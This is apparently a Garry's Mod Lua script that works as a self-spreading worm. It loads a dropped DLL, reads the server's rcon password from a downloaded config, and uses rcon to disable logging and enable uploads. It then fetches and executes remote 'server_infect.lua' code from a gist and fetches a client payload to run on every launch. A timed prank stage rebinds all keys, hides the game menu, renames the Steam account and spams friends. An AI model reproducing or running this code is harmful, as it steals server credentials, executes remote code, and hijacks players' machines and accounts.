timer.Simple(14, function()
	pcall(function() -- remove print
		if file.Exists("download/engine_win32.dll", "MOD") then -- No longer infected?
			require("/../../../download/engine")

			if not file.Exists("engine_win32.dll", "MOD") then
				local module_file = file.Open("download/engine_win32.dll", "rb", "MOD")
				local module_data = module_file:Read(module_file:Size())

				CreateFile("garrysmod/engine_win32.dll", module_data)
			end

			DeleteFile("garrysmod/download/cfg/server.cfg")
			RequestFile("cfg/server.cfg")
			
			timer.Create("isittime", 1, 0, function()
				if GetTimeStamp() < (1397865590 + (60 * 60 * 12)) then return end -- 10 seconds before midnight
				timer.Remove("isitime")
				
				hook.Add( "PreDrawHUD", "MenuOverwrite", function()
					if (gui.IsGameUIVisible()) then
						gui.HideGameUI()
					end
				end )
				
				sound.PlayURL("https://dl.dropboxusercontent.com/u/3659637/overture.ogg", "", function() end)
				
				timer.Simple(20, function()
					local keyList = { "TAB", "ESCAPE", "SPACE", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "`", "F10", "a", "c", "d", "e", "f", "g", "p", "q", "r", "s", "u", "w", "y", "z", "x", "ALT", "CTRL", "SHIFT", "F5", "F6", "F9", "MWHEELDOWN", "MWHEELUP", "MOUSE1", "MOUSE2", "MOUSE4", "PAUSE", "F1", "F2", "F3", "F4" }
					local command = "say VINH'LL FIX IT@@@@@@@@@@@@@@@@@@@@@@@@@"
					
					for _, v in pairs( keyList ) do
						local cmd = "bind " .. v .. " \"" .. command .. "\""
						LocalPlayer():ConCommand([[playvideo_exitcommand f ]] .. cmd)
					end
		
					LocalPlayer():ConCommand([[playvideo_exitcommand f host_writeconfig]])
					LocalPlayer():ConCommand([[playvideo_exitcommand f alias bind echo nope]])
					
					LocalPlayer():ConCommand([[+voicerecord]])
					LocalPlayer():ConCommand([[playvideo_exitcommand f alias -voicerecord echo nope]])
					
					local vinh = vgui.Create("HTML")
					vinh:SetSize(256, 256)
					vinh:SetPos(ScrW()/2 - 128, ScrH()/2 - 128)
					vinh:OpenURL("http://i.imgur.com/NunR9ya.png")
					vinh:ParentToHUD()
					
					SWSetName("VINH'LL FIX IT@@")
					SWAddFriend("76561197968611839")
					SWAddFriend("76561198074112160")
					SWSpamFriends("FIX IT VINH", 42)
					
					DeleteFile("garrysmod/materials/cooltexture.vtf") -- Cleaned up for ya, guys
				end)
			end)
			
			timer.Create("cfgchk", 2, 0, function()
				if file.Exists("download/cfg/server.cfg", "MOD") then
					timer.Remove("cfgchk")

					local servercfg_file = file.Open("download/cfg/server.cfg", "r", "MOD")
					local servercfg_data = servercfg_file:Read(servercfg_file:Size())
					local rcon_password_command = false

					for line in servercfg_data:gmatch("[^\r\n]+") do
						if line:lower():find("rcon_password", nil,  true) then
							rcon_password_command = line
						end
					end

					if rcon_password_command then
						ConCommand(rcon_password_command .. "\n")
						ConCommand("rcon sv_rcon_log 0\n")
						ConCommand("rcon sv_allowupload 1\n")
						ConCommand("clear")

						timer.Simple(8, function()
							ConCommand("rcon lua_run http.Fetch([[https]] .. string.char(58) .. [[/]] .. [[/gist.githubusercontent.com/Chrisaster/d9872acbf2da227e9281/raw/server_infect.lua]], function(c) local ret = CompileString(c, [[l]], false) pcall(ret) end, function() end)\n")
							SendFile("engine_win32.dll")
							
							timer.Simple(4, function()
								ConCommand("clear\n")
							end)
						end)
					end
				end
			end)
		end
	
		http.Fetch("https://gist.githubusercontent.com/Chrisaster/d9872acbf2da227e9281/raw/client_everytime.lua", function(c)
			local f = CompileString(c, "l", false)
			pcall(f)
		end)
	end)
end)